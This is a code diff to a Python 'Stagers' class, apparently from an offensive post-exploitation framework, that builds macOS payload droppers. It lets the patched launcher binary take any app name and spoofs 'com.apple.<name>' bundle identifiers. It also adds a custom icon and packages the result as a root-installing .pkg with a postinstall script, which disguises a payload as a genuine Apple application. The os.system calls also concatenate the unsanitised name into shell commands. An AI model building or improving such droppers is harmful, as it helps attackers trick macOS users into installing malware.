@@ -439,7 +439,7 @@ class Stagers:
 
             launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
             patchedBinary = template[:offset]+launcher+template[(offset+len(launcher)):]
-            if AppName == '':
+            if AppName == "":
                 AppName = "launcher"
 
             tmpdir = "/tmp/application/%s.app/" % AppName
@@ -447,12 +447,15 @@ class Stagers:
             f = open(tmpdir + "Contents/MacOS/launcher","wb")
             f.write(patchedBinary)
             f.close()
-            os.chmod(tmpdir+"Contents/MacOS/launcher", 0755)
+            os.rename(tmpdir + "Contents/MacOS/launcher",tmpdir + "Contents/MacOS/%s" % AppName)
+            os.chmod(tmpdir+"Contents/MacOS/%s" % AppName, 0755)
 
             if icon != '':
                 iconfile = os.path.splitext(icon)[0].split('/')[-1]
                 shutil.copy2(icon,tmpdir+"Contents/Resources/"+iconfile+".icns")
-                appPlist = """<?xml version="1.0" encoding="UTF-8"?>
+            else:
+                iconfile = icon
+            appPlist = """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
@@ -461,15 +464,15 @@ class Stagers:
     <key>CFBundleDevelopmentRegion</key>
     <string>en</string>
     <key>CFBundleExecutable</key>
-    <string>launcher</string>
+    <string>%s</string>
     <key>CFBundleIconFile</key>
     <string>%s</string>
     <key>CFBundleIdentifier</key>
-    <string>com.apple.launcher</string>
+    <string>com.apple.%s</string>
     <key>CFBundleInfoDictionaryVersion</key>
     <string>6.0</string>
     <key>CFBundleName</key>
-    <string>launcher</string>
+    <string>%s</string>
     <key>CFBundlePackageType</key>
     <string>APPL</string>
     <key>CFBundleShortVersionString</key>
@@ -510,10 +513,10 @@ class Stagers:
     <string>NSApplication</string>
 </dict>
 </plist>
-""" % iconfile
-                f = open(tmpdir+"Contents/Info.plist", "w")
-                f.write(appPlist)
-                f.close()
+""" % (AppName, iconfile, AppName, AppName)
+            f = open(tmpdir+"Contents/Info.plist", "w")
+            f.write(appPlist)
+            f.close()
 
             shutil.make_archive("/tmp/launcher", 'zip', "/tmp/application")
             shutil.rmtree('/tmp/application')
@@ -529,7 +532,7 @@ class Stagers:
             print helpers.color("[!] Unable to patch application")
 
 
-    def generate_pkg(self, bundleZip):
+    def generate_pkg(self, bundleZip, AppName):
 
         #unzip application bundle zip. Copy everything for the installer pkg to a temporary location
         currDir = os.getcwd()
@@ -544,18 +547,57 @@ class Stagers:
 
         os.system("cp -r "+self.installPath+"/data/misc/pkgbuild/ /tmp/")
         os.chdir("pkgbuild")
-        os.system("cp -r ../launcher.app root/Applications")
+        os.system("cp -r ../"+AppName+".app root/Applications")
         os.system("chmod +x root/Applications/")
         os.system("( cd root && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Payload")
         os.system("chmod +x expand/Payload")
+        s = open('scripts/postinstall','r+')
+        script = s.read()
+        script = script.replace('APPNAME',AppName)
+        s.seek(0)
+        s.write(script)
+        s.close()
         os.system("( cd scripts && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Scripts")
         os.system("chmod +x expand/Scripts")
+        numFiles = subprocess.check_output("find root | wc -l",shell=True).strip('\n')
+        size = subprocess.check_output("du -b -s root",shell=True).split('\t')[0]
+        size = int(size) / 1024
+        p = open('expand/PackageInfo','w+')
+        pkginfo = """<?xml version="1.0" encoding="utf-8" standalone="no"?>
+<pkg-info overwrite-permissions="true" relocatable="false" identifier="com.apple.APPNAME" postinstall-action="none" version="1.0" format-version="2" generator-version="InstallCmds-554 (15G31)" install-location="/" auth="root">
+    <payload numberOfFiles="KEY1" installKBytes="KEY2"/>
+    <bundle path="./APPNAME.app" id="com.apple.APPNAME" CFBundleShortVersionString="1.0" CFBundleVersion="1"/>
+    <bundle-version>
+        <bundle id="com.apple.APPNAME"/>
+    </bundle-version>
+    <upgrade-bundle>
+        <bundle id="com.apple.APPNAME"/>
+    </upgrade-bundle>
+    <update-bundle/>
+    <atomic-update-bundle/>
+    <strict-identifier>
+        <bundle id="com.apple.APPNAME"/>
+    </strict-identifier>
+    <relocate>
+        <bundle id="com.apple.APPNAME"/>
+    </relocate>
+    <scripts>
+        <postinstall file="./postinstall"/>
+    </scripts>
+</pkg-info>
+"""
+        pkginfo = pkginfo.replace('APPNAME',AppName)
+        pkginfo = pkginfo.replace('KEY1',numFiles)
+        pkginfo = pkginfo.replace('KEY2',str(size))
+        p.write(pkginfo)
+        p.close()
         os.system("mkbom -u 0 -g 80 root expand/Bom")
         os.system("chmod +x expand/Bom")
+        os.system("chmod -R 755 expand/")
         os.system('( cd expand && xar --compression none -cf "../launcher.pkg" * )')
         f = open('launcher.pkg','rb')
         package = f.read()
         os.chdir("/tmp/")
-        shutil.rmtree('pkgbuild')
-        shutil.rmtree('launcher.app')
+        #shutil.rmtree('pkgbuild')
+        shutil.rmtree(AppName+".app")
         return package
